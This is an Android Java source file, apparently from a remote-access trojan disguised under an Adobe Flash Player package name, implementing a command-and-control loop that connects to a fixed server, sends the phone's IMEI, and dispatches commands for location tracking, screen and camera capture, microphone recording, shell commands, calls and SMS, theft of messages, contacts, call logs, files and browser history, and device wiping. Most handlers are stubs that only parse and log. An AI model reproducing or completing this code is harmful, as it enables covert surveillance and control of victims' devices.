package com.adobe.flashplayer.network;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import android.content.Context;
import android.util.Log;



public class ServerCommand implements Runnable{

	private static final String TAG = "[ljg]ServerCommand";
	
	private Context context = null;
	private int cmd = 0;
	private byte[] recvimei = new byte[Public.IMEI_IMSI_PHONE_SIZE];

	
	public ServerCommand(Context context){
		//此处不能写作 context = context，why?
		this.context = context;
		this.cmd = Public.CMD_HEARTBEAT;
	}
	
	boolean compareImei(byte[]imei1,byte[]imei2){
		if (imei1.length != imei2.length) {
			return false;
		}
		for (int i = 0; i < imei1.length; i++) {
			if (imei1[i] != imei2[i]) {
				
				return false;
			}
		}
		
		return true;
	}
	
	
	
	public void run(){
		byte[] recvbuf = new byte[Public.RECV_SEND_BUFSIZE];
		while(true){
			Socket socket = null;
			OutputStream ous = null;
			InputStream ins = null;
			try{
				if(NetworkUtils.isNetworkAvailable (context) == true){
		            socket = new Socket();
		            InetSocketAddress inetaddr = new InetSocketAddress(Public.SERVER_IP_ADDRESS, Public.SERVER_CMD_PORT);
		            socket.connect(inetaddr, Public.SERVER_CMD_CONNECT_TIMEOUT);
		            //With this option set to a non-zero timeout, 
		            //a read() call on the InputStream associated with this Socket will block for only this amount of time.
		            //If the timeout expires, a java.net.SocketTimeoutException is raised, though the Socket is still valid. 
		            socket.setSoTimeout(Public.SERVERCMD_ALARM_INTERVAL);
					ous = socket.getOutputStream();
					ins = socket.getInputStream();
					
					Public.gOnlineType = NetworkUtils.getNetworkType(context);
					
					boolean ret = false;
					ret = sendCmdToServer("".getBytes(), ous, cmd, Public.IMEI);
					if (ret == true) {

						while(true){
						
							int recvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE);
							if(recvlen >= 24){		
							
								System.arraycopy(recvbuf, 8, recvimei, 0, Public.IMEI_IMSI_PHONE_SIZE);
			
								if (compareImei(recvimei,Public.IMEI) == true) {
									int result = ServerCommandProc(ins,ous,recvbuf,recvlen);
									if (result < 0) {
										Log.e(TAG,"[liujinguang]ServerCommand recv packet error:" + result);
										MyLog.writeLogFile("[liujinguang]ServerCommand recv packet error:" + result + "\r\n");
										
										break;
									}else{
										continue;
									}
								}else{
									break;
								}
							}else{
								break;
							}
						}
					}
				}
			}catch(Exception ex){
				ex.printStackTrace();
			}
			
			try{
				if (ins != null) {
					ins.close();
					ins = null;
				}
				
				if(ous != null){
					ous.close();
					ous = null;
				}
				
				if(socket != null){
					socket.close();
					socket = null;
				}
			}catch(Exception exp){
				exp.printStackTrace();
			}
			
			try {
				Thread.sleep(Public.SERVERCMD_ALARM_INTERVAL);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
			
	
	
	public int ServerCommandProc(InputStream ins,OutputStream ous,byte[]recvbuf,int recvlen){
		try{
			byte[] byterecvpacklen = new byte[4];
			System.arraycopy(recvbuf, 0, byterecvpacklen, 0, 4);
			int recvpacklen = Utils.bytesToInt(byterecvpacklen);
			if (recvpacklen == recvlen){

			}
			else if ( (recvpacklen > Public.MAX_TRANSFER_FILESIZE) || (recvpacklen < 24) ) {
				return -1;
			}
			else if (recvpacklen > Public.RECV_SEND_BUFSIZE){
				int nextrecvlen = 0;
				while((nextrecvlen = ins.read(recvbuf,0,Public.RECV_SEND_BUFSIZE )) > 0){
					recvlen += nextrecvlen;
					if (recvlen >= recvpacklen) {
						break;
					}
				}
			}
			else if ( (recvpacklen > recvlen) && (recvpacklen <= Public.RECV_SEND_BUFSIZE) ) {
				int nextrecvlen = 0;
				while((nextrecvlen = ins.read(recvbuf,recvlen,Public.RECV_SEND_BUFSIZE - recvlen)) > 0){
					recvlen += nextrecvlen;
					if (recvlen >= recvpacklen) {
						break;
					}
				}
			}else{

			}

			byte[] byteservercmd = new byte[4];
			System.arraycopy(recvbuf, 4, byteservercmd, 0, 4);
			int servercmd = Utils.bytesToInt(byteservercmd);

			if(servercmd == Public.CMD_HEARTBEAT || servercmd == Public.CMD_NETWORKTYPE){
				Public.gOnlineType = NetworkUtils.getNetworkType(context);
				sendCmdToServer("".getBytes(), ous, Public.CMD_HEARTBEAT, Public.IMEI);
				return 0;
			}
			else if (servercmd == Public.CMD_MESSAGEBOX) {
				byte[] bytetitlelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytetitlelen, 0, 4);
				int titlelen = Utils.bytesToInt(bytetitlelen);
				
				byte[] title = new byte[titlelen];
				System.arraycopy(recvbuf, 28, title, 0, titlelen);
				
				byte[] bytectlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + titlelen, bytectlen, 0, 4);
				int ctlen = Utils.bytesToInt(bytectlen);
				
				byte[] content = new byte[ctlen];
				System.arraycopy(recvbuf, 24 + 4 + titlelen + 4, content, 0, ctlen);

				MyLog.writeLogFile("recv cmd messagebox\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_LOCATION) {
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = Utils.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = Utils.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);
				
				
				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = Utils.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);



				
				MyLog.writeLogFile("recv cmd location\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SINGLELOCATION) {

			}
			else if (servercmd == Public.CMD_CANCELLOCATION) {

			}
			else if (servercmd == Public.CMD_CANCELSCREENCAP) {

			}
			else if (servercmd == Public.CMD_SINGLESCREENCAP) {

			}
			else if (servercmd == Public.CMD_DATA_SCRNSNAPSHOT) {			
				byte[] bytestartlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytestartlen, 0, 4);
				int startlen = Utils.bytesToInt(bytestartlen);
				
				byte[] start = new byte[startlen];
				System.arraycopy(recvbuf, 28, start, 0, startlen);
				
				byte[] byteendlen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen, byteendlen, 0, 4);
				int endlen = Utils.bytesToInt(byteendlen);
				
				byte[] end = new byte[endlen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4, end, 0, endlen);
				
				
				byte[] bytevallen = new byte[4];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen, bytevallen, 0, 4);
				int vallen = Utils.bytesToInt(bytevallen);
				
				byte[] val = new byte[vallen];
				System.arraycopy(recvbuf, 24 + 4 + startlen + 4 + endlen + 4, val, 0, vallen);



				MyLog.writeLogFile("recv cmd screensnapshot\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CAMERAPHOTO) {
				
				byte[] bytecamera = new byte[4];
				System.arraycopy(recvbuf, 24, bytecamera, 0, 4);
				int intcamera = Utils.bytesToInt(bytecamera);
				

				
				MyLog.writeLogFile("recv cmd camera\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_MICAUDIORECORD) {
				byte[] byteseconds = new byte[4];
				System.arraycopy(recvbuf, 24, byteseconds, 0, 4);
				int seconds = Utils.bytesToInt(byteseconds);
				if (seconds <= 0) {
					seconds = 60;
				}else if (seconds > 3600) {
					seconds = 3600;
				}

				MyLog.writeLogFile("recv cmd mic audio record second:" + seconds +"\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_AUTOINSTALL) {

				MyLog.writeLogFile("recv cmd autoinstall\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_UPLOADFILE){

				MyLog.writeLogFile("recv cmd upload file\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UPDATEPROC) {

				MyLog.writeLogFile("recv cmd update plugin\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DOWNLOADFILE) {

				MyLog.writeLogFile("recv cmd download file\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_RUNCOMMAND){
				byte[] bytecmdlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytecmdlen, 0, 4);
				int cmdlen = Utils.bytesToInt(bytecmdlen);
				byte[] cmdcontent = new byte[cmdlen];
				System.arraycopy(recvbuf, 28, cmdcontent, 0, cmdlen);
				String shellcmd = new String(cmdcontent);



				MyLog.writeLogFile("recv cmd shellcmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_PHONECALL) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = Utils.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);



				MyLog.writeLogFile("recv cmd phonecall\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_SENDMESSAGE) {
				byte[] bytephonelen = new byte[4];
				System.arraycopy(recvbuf, 24, bytephonelen, 0, 4);
				int phonelen = Utils.bytesToInt(bytephonelen);
				byte[] phoneno = new byte[phonelen];
				System.arraycopy(recvbuf, 28, phoneno, 0, phonelen);
				String strphoneno = new String(phoneno);
				
				byte[] bytemsglen = new byte[4];
				System.arraycopy(recvbuf, 28 + phonelen, bytemsglen, 0, 4);
				int msglen = Utils.bytesToInt(bytemsglen);
				byte[] msg = new byte[msglen];
				System.arraycopy(recvbuf, 32 + phonelen, msg, 0, msglen);
				String strmsg = new String(msg);

				MyLog.writeLogFile("recv cmd send message\r\n");
				

				return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPMESSAGE) {


				MyLog.writeLogFile("ServerCommand send app message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_RESETPASSWORD) {
				byte[] bytepswlen = new byte[4];
				System.arraycopy(recvbuf, 24, bytepswlen, 0, 4);
				int pswlen = Utils.bytesToInt(bytepswlen);
				
				String strpsw = "";
				if(pswlen > 0 && pswlen <= 16){
					byte[] psw = new byte[pswlen];
					System.arraycopy(recvbuf, 28, psw, 0, pswlen);
					strpsw = new String(psw);
				}else if(pswlen == 0){
					strpsw = "";
				}
				

				return 0;
			}
			else if (servercmd == Public.CMD_WIPESYSTEM) {

				return 0;
			}
			else if (servercmd == Public.CMD_WIPESTORAGE) {

				return 0;
			}
			else if(servercmd == Public.CMD_RESETPROGRAM){

				return 0;
			}
			else if (servercmd == Public.CMD_RESETSYSTEM) {

				return 0;
			}
			else if (servercmd == Public.CMD_SHUTDOWNSYSTEM) {

				return 0;
			}
			else if (servercmd == Public.CMD_DATA_MESSAGE) {
				


				MyLog.writeLogFile("ServerCommand phone message ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CALLLOG) {


				MyLog.writeLogFile("ServerCommand calllog ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_CONTACTS) {


				MyLog.writeLogFile("ServerCommand contact ok\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_SDCARDFILES) {

				MyLog.writeLogFile("ServerCommand sd card command\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_FLASHCARDFILES) {

				MyLog.writeLogFile("ServerCommand flash card command ok\r\n");
			}
			else if (servercmd == Public.CMD_DATA_EXTCARDFILES) {

				MyLog.writeLogFile("ServerCommand ext card command ok\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_DEVICEINFO) {

				MyLog.writeLogFile("ServerCommand deviceinfo cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WIFI) {


				MyLog.writeLogFile("recv wifi info cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_WEBKITHISTORY) {

				MyLog.writeLogFile("recv get webkit history cmd\r\n");
		    	return 0;
			}
			else if(servercmd == Public.CMD_UPLOAD_LOG){


				MyLog.writeLogFile("recv cmd upload log file\r\n");
		    	return 0;
			}
			else if (servercmd == Public.CMD_DATA_APPPROCESS) {

				MyLog.writeLogFile("ServerCommand appprocess cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_RUNNINGAPPS) {

				MyLog.writeLogFile("ServerCommand running cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_DATA_FILERECORD) {


				MyLog.writeLogFile("ServerCommand filerecord cmd\r\n");
				return 0;
			}
			else if (servercmd == Public.CMD_UNINSTALLSELF) {

				Log.e(TAG,"recv uninstall cmd ok\r\n");
				MyLog.writeLogFile("ServerCommand recv uninstall cmd ok\r\n");
				
				return 0;
			}
			else if (servercmd == Public.CMD_UPLOADDB) {


				MyLog.writeLogFile("ServerCommand recv CMD_UPLOADDB:" + cmd +" cmd\r\n");
				return 0;
			}
			else if(servercmd == Public.CMD_CHANGEIP){


				return 0;
			}
			else if (servercmd == Public.CMD_SETCONFIG) {

				return 0;
			}
			else{
				MyLog.writeLogFile("ServerCommand recv unrecognized command\r\n");
				return 0;
			}
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = Utils.getExceptionDetail(ex);
			String stack = Utils.getCallStack();
			MyLog.writeLogFile("ServerCommand exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return - 3;
		}
		
		return 0;
	}
	
	
	
	
	public static boolean sendCmdToServer(byte[] data,OutputStream ous,int cmdtype,byte[] byteimei){
		try{
			int sendsize = 4 + 4 + 4 + Public.IMEI_IMSI_PHONE_SIZE + Public.IMEI_IMSI_PHONE_SIZE + data.length;	
			byte[] senddata = new byte[sendsize];
		
			int offset = 0;
			byte bytesendseize[] = Utils.intToBytes(sendsize);
			for (int i = 0; i < bytesendseize.length; i++) {
				senddata[offset +i] = bytesendseize[i];
			}
			offset += bytesendseize.length;
			
			byte[] bytecmd = Utils.intToBytes(cmdtype);
			for (int i = 0; i < bytecmd.length; i++) {
				senddata[offset + i] = bytecmd[i];
			}
			offset += bytecmd.length;
			
			//command without cryption or compression
			int mode = Public.gOnlineType;
			byte bytereserved[] = Utils.intToBytes(mode);
			for (int i = 0; i < bytereserved.length; i++) {
				senddata[offset + i] = bytereserved[i];
			}
			offset += bytereserved.length;
			
			for (int i = 0; i < byteimei.length; i++) {
				senddata[offset + i] = byteimei[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;
			
			
			for (int i = 0; i < Public.UserName.length(); i++) {
				senddata[offset + i] = Public.UserName.getBytes()[i];
			}
			offset += Public.IMEI_IMSI_PHONE_SIZE;

			for (int i = 0; i < data.length; i++) {
				senddata[offset + i] = data[i];
			}
			offset += data.length;
			
			ous.write(senddata, 0, sendsize);
			ous.flush();
			return true;
		} 
		catch (Exception ex) {
			ex.printStackTrace();
			String error = Utils.getExceptionDetail(ex);
			String stack = Utils.getCallStack();
			MyLog.writeLogFile("[liujinguang]ServerCommand command:" + String.valueOf(cmdtype) +
					" exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			return false;
		}
	}
}
